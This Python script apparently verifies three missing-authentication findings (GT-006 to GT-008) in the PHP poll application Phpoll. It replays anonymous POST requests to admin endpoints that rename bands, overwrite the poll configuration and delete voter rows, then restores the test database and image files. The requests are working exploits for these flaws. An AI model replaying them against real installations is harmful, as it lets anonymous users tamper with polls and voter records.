"""Manual ground-truth verification for Phpoll (GT-006 .. GT-008).

All three admin modification endpoints contain no authentication check at all;
the visitor POST path is replayed here with token markers and the resulting
database state is inspected. modifica_configurazione.php additionally rewrites
img/barra*.gif files, which are backed up and restored inside the record.
"""

from __future__ import annotations

import json
from pathlib import Path

import verifier as v

APP = "phpoll"
BAND = "phpoll_test_band"
VOTI = "phpoll_test_voti"
CONFIG = "phpoll_test_configurazione"


def gt006(det, db) -> dict:
    """admin/modifica_band.php — visitor updates band name (token1 -> token2)."""
    r = v.Recorder(APP, "GT-006", db)
    row = db.rows(f"SELECT id, nome_band, voti FROM {BAND} ORDER BY id LIMIT 1")[0]
    band_id, _, voti = row[0], row[1], row[2]
    t1 = v.token("band_before")
    t2 = v.token("band_after")
    db.execute(f"UPDATE {BAND} SET nome_band='{t1}' WHERE id={band_id}")
    r.add("instrument", {"table": BAND, "row": f"id={band_id}", "column": "nome_band",
                         "token1": t1, "token2": t2})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "admin/modifica_band.php", {
            "method": "POST",
            "params": {
                "nome_band_0": t2,
                "voti_0": voti,
                "id_0": band_id,
            },
            "referer": "admin/band_editor.php?language=1",
        })
        after = db.scalar(f"SELECT nome_band FROM {BAND} WHERE id={band_id}")
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST admin/modifica_band.php nome_band_0={t2} id_0={band_id}",
            "status_code": resp["status_code"],
            "db_nome_band_before": t1,
            "db_nome_band_after": after,
            "updated": (after == t2),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if after == t2 else "not_confirmed"
    summary = (f"visitor POST to admin/modifica_band.php returned {resp['status_code']}; "
               f"band row id={band_id} nome_band changed {t1} -> {after} (updated={after == t2}).")
    return r.finish(verdict, summary)


def _config_row(db) -> dict[str, str]:
    columns = db.rows(f"SHOW COLUMNS FROM {CONFIG}")
    names = [item[0] for item in columns]
    row = db.rows(f"SELECT * FROM {CONFIG} LIMIT 1")[0]
    return {name: row[index] if index < len(row) else "" for index, name in enumerate(names)}


def gt007(det, db) -> dict:
    """admin/modifica_configurazione.php — visitor rewrites the whole poll
    configuration (TRUNCATE + INSERT) with attacker-controlled values."""
    r = v.Recorder(APP, "GT-007", db)
    t1 = v.token("cfg_before")
    t2 = v.token("cfg_after")
    db.execute(f"UPDATE {CONFIG} SET oggetto_email='{t1}' WHERE id=1")
    r.add("instrument", {"table": CONFIG, "row": "id=1", "column": "oggetto_email",
                         "token1": t1, "token2": t2})

    row = _config_row(db)
    params = {
        "messaggio_ip": row.get("messaggio_ip", ""),
        "intervallo_tempo": row.get("intervallo_tempo", "0"),
        "testo_submit": row.get("testo_submit", ""),
        "max_voti": row.get("max_voti", "0"),
        "domini": row.get("domini", ""),
        "oggetto_email": t2,
        "testo_email": row.get("testo_email", ""),
        "valid_email": row.get("valid_email", ""),
        "messaggio_conferma_mail": row.get("messaggio_conferma_mail", ""),
        "messaggio_domini": row.get("messaggio_domini", ""),
        "messaggio_giavotato": row.get("messaggio_giavotato", ""),
        "messaggio_sgamo": row.get("messaggio_sgamo", ""),
        "titolo_posizione": row.get("titolo_posizione", ""),
        "titolo_tipologia": row.get("titolo_tipologia", ""),
        "titolo_punteggio": row.get("titolo_punteggio", ""),
        "risultati_pixel": row.get("risultati_pixel", "1"),
        "login": row.get("login", ""),
        "password": row.get("password", ""),
        "barra1": "#000000",
        "barra2": "#000000",
        "barra3": "#000000",
        "barra4": "#000000",
        "percorso_link": row.get("percorso_link", ""),
    }
    img_dir = Path("D:/phpStudy/PHPTutorial/WWW/phpoll/polls/test/img")
    backups = {}
    for name in ("barra1.gif", "barra2.gif", "barra3.gif", "barra4.gif"):
        path = img_dir / name
        backups[name] = path.read_bytes() if path.is_file() else None

    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "admin/modifica_configurazione.php", {
            "method": "POST", "params": params, "referer": "admin/config_editor.php?language=1",
        })
        after = db.scalar(f"SELECT oggetto_email FROM {CONFIG} WHERE id=1")
        login_after = db.scalar(f"SELECT login FROM {CONFIG} WHERE id=1")
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST admin/modifica_configurazione.php oggetto_email={t2}",
            "status_code": resp["status_code"],
            "db_oggetto_email_before": t1,
            "db_oggetto_email_after": after,
            "db_login_after": login_after,
            "updated": (after == t2),
        })
    finally:
        v.close_session(sess)
        for name, data in backups.items():
            path = img_dir / name
            if data is None:
                path.unlink(missing_ok=True)
            else:
                path.write_bytes(data)
    verdict = "vulnerable" if after == t2 else "not_confirmed"
    summary = (f"visitor POST to admin/modifica_configurazione.php returned {resp['status_code']}; "
               f"configuration was truncated and rewritten: oggetto_email {t1} -> {after} "
               f"(updated={after == t2}); barra*.gif image files were restored afterwards.")
    return r.finish(verdict, summary)


def gt008(det, db) -> dict:
    """admin/modifica_votanti.php — visitor deletes voter rows (token row gone)."""
    r = v.Recorder(APP, "GT-008", db)
    tok = v.token("voter")
    db.execute(
        f"INSERT INTO {VOTI} (ip, band_votate, timestamp, votato, email, browser) "
        f"VALUES ('{tok}', '', 0, 'no', '{tok}@example.test', 'drhl')"
    )
    # LAST_INSERT_ID() is per-connection and useless through one-shot CLI calls;
    # look the row up by the token instead.
    row_id = db.scalar(f"SELECT id FROM {VOTI} WHERE ip='{tok}' ORDER BY id DESC LIMIT 1")
    exists_before = db.scalar(f"SELECT COUNT(*) FROM {VOTI} WHERE id={row_id}")
    r.add("instrument", {"table": VOTI, "inserted_row_id": row_id, "token": tok,
                         "exists_before": exists_before})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "admin/modifica_votanti.php", {
            "method": "POST",
            "params": {row_id: "on"},
            "referer": "admin/votanti.php?language=1",
        })
        exists_after = db.scalar(f"SELECT COUNT(*) FROM {VOTI} WHERE id={row_id}")
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST admin/modifica_votanti.php {{{row_id}: 'on'}}",
            "status_code": resp["status_code"],
            "row_exists_after": exists_after,
            "deleted": (exists_after == "0"),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exists_after == "0" else "not_confirmed"
    summary = (f"visitor POST to admin/modifica_votanti.php returned {resp['status_code']}; "
               f"instrumented voter row id={row_id} (ip={tok}) was deleted (exists_after={exists_after}).")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = []
    for fn in (gt006, gt007, gt008):
        results.append(v.run_record(snap, lambda fn=fn: fn(det, db), baseline, cfg.database))
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:120]}")


if __name__ == "__main__":
    main()
